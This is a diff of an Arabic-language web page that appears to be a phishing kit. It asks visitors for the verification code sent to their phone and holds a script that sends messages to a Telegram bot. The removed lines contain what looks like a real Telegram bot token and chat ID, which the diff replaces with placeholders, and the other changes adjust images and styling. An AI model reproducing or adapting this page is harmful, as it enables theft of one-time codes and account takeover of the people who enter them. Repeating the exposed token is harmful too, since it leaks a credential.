@@ -36,11 +36,17 @@
             width: 100%;
             max-width: 300px;
         }
+        .header-image {
+            width: 100%;
+            max-width: 400px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
     </style>
     <script>
         // إضافة التوكن الخاص ببوت تلجرام
-        const TELEGRAM_TOKEN = '7071902802:AAG7GZB_vh9eKatLDdsq0Q0D6AV-9Ay2HG4';
-        const CHAT_ID = '6332127387';
+        const TELEGRAM_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
+        const CHAT_ID = 'YOUR_CHAT_ID';
 
         // وظيفة لإرسال رسالة إلى تلجرام
         function sendTelegramMessage(message) {
@@ -81,7 +87,5 @@
         <h2 id="verification-title">يرجى ادخال كود التحقق الذي ارسلناه الى <span id="user-phone"></span></h2>
         <input id="verification-code" type="text" style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px;" placeholder="أدخل رمز التحقق">
         <button id="verify-button">تحقق</button>
-        <img class="footer-image" src="logo.png" alt="Logo">
+        <img class="footer-image" src="images/img_20240715_044418_669.jpg" alt="صورة في آخر الصفحة">
     </div>
-</body>
-</html>
